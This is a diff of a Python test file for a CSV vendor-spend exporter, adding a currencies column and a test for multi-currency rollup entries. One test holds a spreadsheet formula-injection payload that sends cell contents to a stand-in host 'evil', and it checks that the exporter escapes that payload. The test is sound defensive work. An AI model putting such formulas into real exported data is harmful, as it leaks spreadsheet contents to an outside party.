@@ -199,15 +199,16 @@ def test_invoice_register_missing_fields_emit_empty_not_none():
 
 def test_vendor_spend_accepts_tuple_rows_from_sql_aggregation():
     """SQL aggregation returns `(vendor_name, count, total)`
-    tuples; the exporter handles both tuples and ORM-like objects."""
+    tuples; the exporter handles both tuples and ORM-like objects. A plain
+    positional tuple carries no currency info, so that column is blank."""
     rows_tuples = [
         ("Acme", 5, Decimal("12345.67")),
         ("Globex", 3, Decimal("9999.99")),
     ]
     csv_text = export_vendor_spend(rows_tuples)
     rows = _read(csv_text)
-    assert rows[0] == ["vendor_name", "invoice_count", "total_amount"]
-    assert rows[1] == ["Acme", "5", "12345.67"]
+    assert rows[0] == ["vendor_name", "invoice_count", "total_amount", "currencies"]
+    assert rows[1] == ["Acme", "5", "12345.67", ""]
 
 
 def test_vendor_spend_accepts_namespace_rows():
@@ -215,7 +216,23 @@ def test_vendor_spend_accepts_namespace_rows():
         SimpleNamespace(vendor_name="Acme", invoice_count=5, total_amount=Decimal("100")),
     ]
     out = _read(export_vendor_spend(rows))
-    assert out[1] == ["Acme", "5", "100.00"]
+    assert out[1] == ["Acme", "5", "100.00", ""]
+
+
+def test_vendor_spend_accepts_vendor_spend_entry_rows():
+    """The real caller: `currency_conversion.VendorSpendEntry` — the
+    multi-currency-aware rollup result. `.vendor`/`.amount` (not
+    `.vendor_name`/`.total_amount`) and `.currencies` populate the new
+    column."""
+    from app.services.currency_conversion import VendorSpendEntry
+
+    rows = [
+        VendorSpendEntry(
+            vendor="Acme", amount=Decimal("300.00"), invoice_count=2, currencies=["EUR", "USD"]
+        ),
+    ]
+    out = _read(export_vendor_spend(rows))
+    assert out[1] == ["Acme", "2", "300.00", "EUR, USD"]
 
 
 # ---------------------------------------------------------------------------
@@ -437,8 +454,8 @@ def test_vendor_spend_export_quotes_malicious_vendor_name():
     evil = '=HYPERLINK("http://evil/"&A1,"x")'
     csv_text = export_vendor_spend([(evil, 3, Decimal("100.00"))])
     rows = _read(csv_text)
-    assert rows[0] == ["vendor_name", "invoice_count", "total_amount"]
+    assert rows[0] == ["vendor_name", "invoice_count", "total_amount", "currencies"]
     assert rows[1][0] == "'" + evil
     # A legitimate negative total is still a parseable number.
     csv_text2 = export_vendor_spend([("Acme", 1, Decimal("-42.50"))])
-    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50"]
+    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50", ""]
